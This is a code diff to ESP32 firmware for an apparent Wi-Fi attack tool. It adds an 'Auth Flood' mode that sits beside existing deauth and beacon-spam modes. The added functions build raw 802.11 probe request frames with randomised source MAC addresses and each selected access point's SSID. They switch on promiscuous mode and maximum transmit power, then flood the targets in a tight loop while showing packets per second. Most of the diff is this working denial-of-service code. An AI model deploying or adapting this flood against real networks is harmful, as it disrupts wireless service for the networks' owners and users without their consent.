@@ -266,6 +266,8 @@ void WiFiScan::StartScan(uint8_t scan_mode, uint16_t color)
     RunBeaconSpam(scan_mode, color);
   else if (scan_mode == WIFI_ATTACK_RICK_ROLL)
     RunRickRoll(scan_mode, color);
+  else if (scan_mode == WIFI_ATTACK_AUTH)
+    RunProbeFlood(scan_mode, color);
   else if (scan_mode == BT_SCAN_ALL)
     RunBluetoothScan(scan_mode, color);
   else if (scan_mode == BT_SCAN_SKIMMERS)
@@ -341,6 +343,7 @@ void WiFiScan::StopScan(uint8_t scan_mode)
   (currentScanMode == WIFI_SCAN_DEAUTH) ||
   (currentScanMode == WIFI_ATTACK_BEACON_LIST) ||
   (currentScanMode == WIFI_ATTACK_BEACON_SPAM) ||
+  (currentScanMode == WIFI_ATTACK_AUTH) ||
   (currentScanMode == WIFI_ATTACK_RICK_ROLL) ||
   (currentScanMode == WIFI_PACKET_MONITOR) ||
   (currentScanMode == LV_JOIN_WIFI))
@@ -826,6 +829,37 @@ void WiFiScan::RunBeaconList(uint8_t scan_mode, uint16_t color)
   //Serial.println("End of func");
 }
 */
+
+// Function to prepare for beacon spam
+void WiFiScan::RunProbeFlood(uint8_t scan_mode, uint16_t color) {
+  display_obj.TOP_FIXED_AREA_2 = 48;
+  display_obj.tteBar = true;
+  display_obj.print_delay_1 = 15;
+  display_obj.print_delay_2 = 10;
+  //display_obj.clearScreen();
+  display_obj.initScrollValues(true);
+  display_obj.tft.setTextWrap(false);
+  display_obj.tft.setTextColor(TFT_BLACK, color);
+  display_obj.tft.fillRect(0,16,240,16, color);
+  display_obj.tft.drawCentreString(" Auth Flood ",120,16,2);
+  display_obj.touchToExit();
+  display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
+  packets_sent = 0;
+  //esp_wifi_set_mode(WIFI_MODE_STA);
+  //WiFi.mode(WIFI_AP_STA);
+  esp_wifi_init(&cfg);
+  esp_wifi_set_storage(WIFI_STORAGE_RAM);
+  //WiFi.mode(WIFI_AP_STA);
+  esp_wifi_set_mode(WIFI_AP_STA);
+  esp_wifi_start();
+  esp_wifi_set_promiscuous_filter(NULL);
+  esp_wifi_set_promiscuous(true);
+  esp_wifi_set_max_tx_power(78);
+  this->wifi_initialized = true;
+  initTime = millis();
+  //display_obj.clearScreen();
+  //Serial.println("End of func");
+}
 
 // Function to prepare for beacon spam
 void WiFiScan::RunBeaconSpam(uint8_t scan_mode, uint16_t color)
@@ -1783,6 +1817,103 @@ void WiFiScan::broadcastRandomSSID(uint32_t currentTime) {
   //Serial.println("Sent packets");
 }
 
+// Function to send probe flood to all "active" access points
+void WiFiScan::sendProbeAttack(uint32_t currentTime) {
+  // Itterate through all access points in list
+  for (int i = 0; i < access_points->size(); i++) {
+
+    // Check if active
+    if (access_points->get(i).selected) {
+      this->set_channel = access_points->get(i).channel;
+      esp_wifi_set_channel(this->set_channel, WIFI_SECOND_CHAN_NONE);
+      delay(1);
+      
+      // Build packet
+      // Randomize SRC MAC
+      
+      prob_req_packet[10] = random(256);
+      prob_req_packet[11] = random(256);
+      prob_req_packet[12] = random(256);
+      prob_req_packet[13] = random(256);
+      prob_req_packet[14] = random(256);
+      prob_req_packet[15] = random(256);
+      
+      /*
+      prob_req_packet[10] = 0xde;
+      prob_req_packet[11] = 0xad;
+      prob_req_packet[12] = 0xbe;
+      prob_req_packet[13] = 0xef;
+      prob_req_packet[14] = 0xde;
+      prob_req_packet[15] = 0xad;
+      */
+
+      // Set dest
+      //assoc_packet[4] = access_points->get(i).bssid[0];
+      //assoc_packet[5] = access_points->get(i).bssid[1];
+      //assoc_packet[6] = access_points->get(i).bssid[2];
+      //assoc_packet[7] = access_points->get(i).bssid[3];
+      //assoc_packet[8] = access_points->get(i).bssid[4];
+      //assoc_packet[9] = access_points->get(i).bssid[5];
+
+      // Set det No. 2
+      //assoc_packet[16] = access_points->get(i).bssid[0];
+      //assoc_packet[17] = access_points->get(i).bssid[1];
+      //assoc_packet[18] = access_points->get(i).bssid[2];
+      //assoc_packet[19] = access_points->get(i).bssid[3];
+      //assoc_packet[20] = access_points->get(i).bssid[4];
+      //assoc_packet[21] = access_points->get(i).bssid[5];
+
+      // Set SSID length
+      int ssidLen = access_points->get(i).essid.length();
+      //int rand_len = sizeof(rand_reg);
+      int fullLen = ssidLen;
+      prob_req_packet[25] = fullLen;
+
+      // Insert ESSID
+      char buf[access_points->get(i).essid.length() + 1] = {};
+      access_points->get(i).essid.toCharArray(buf, access_points->get(i).essid.length() + 1);
+      
+      for(int i = 0; i < ssidLen; i++)
+        prob_req_packet[26 + i] = buf[i];
+        
+      /*
+       * 0x01, 0x08, 0x8c, 0x12, 0x18, 0x24, 
+                                  0x30, 0x48, 0x60, 0x6c, 0x2d, 0x1a, 
+                                  0xad, 0x01, 0x17, 0xff, 0xff, 0x00, 
+                                  0x00, 0x7e, 0x00, 0x00, 0x00, 0x00, 
+                                  0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 
+                                  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
+                                  0x00, 0x00
+       */
+
+      uint8_t postSSID[40] = {0x00, 0x00, 0x01, 0x08, 0x8c, 0x12, 
+                              0x18, 0x24, 0x30, 0x48, 0x60, 0x6c, 
+                              0x2d, 0x1a, 0xad, 0x01, 0x17, 0xff, 
+                              0xff, 0x00, 0x00, 0x7e, 0x00, 0x00, 
+                              0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 
+                              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
+                              0x00, 0x00, 0x00, 0x00};
+
+      uint8_t good_probe_req_packet[26 + fullLen + 40] = {};
+      
+      for (int i = 0; i < 26 + fullLen; i++)
+        good_probe_req_packet[i] = prob_req_packet[i];
+
+      for(int i = 0; i < 40; i++) 
+        good_probe_req_packet[26 + fullLen + i] = postSSID[i];
+
+      
+
+      // Send packet
+      esp_wifi_80211_tx(WIFI_IF_AP, good_probe_req_packet, sizeof(good_probe_req_packet), false);
+      esp_wifi_80211_tx(WIFI_IF_AP, good_probe_req_packet, sizeof(good_probe_req_packet), false);
+      esp_wifi_80211_tx(WIFI_IF_AP, good_probe_req_packet, sizeof(good_probe_req_packet), false);
+
+      packets_sent = packets_sent + 3;
+    }
+  }
+}
+
 
 void WiFiScan::wifiSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
 {
@@ -2431,6 +2562,24 @@ void WiFiScan::main(uint32_t currentTime)
   else if (currentScanMode == WIFI_SCAN_EAPOL)
   {
     eapolMonitorMain(currentTime);
+  }
+  else if (currentScanMode == WIFI_ATTACK_AUTH) {
+    for (int i = 0; i < 55; i++)
+      this->sendProbeAttack(currentTime);
+
+    if (currentTime - initTime >= 1000) {
+      initTime = millis();
+      String displayString = "";
+      String displayString2 = "";
+      displayString.concat("packets/sec: ");
+      displayString.concat(packets_sent);
+      for (int x = 0; x < STANDARD_FONT_CHAR_LIMIT; x++)
+        displayString2.concat(" ");
+      display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
+      display_obj.showCenterText(displayString2, 160);
+      display_obj.showCenterText(displayString, 160);
+      packets_sent = 0;
+    }
   }
   else if ((currentScanMode == WIFI_ATTACK_BEACON_SPAM))
   {
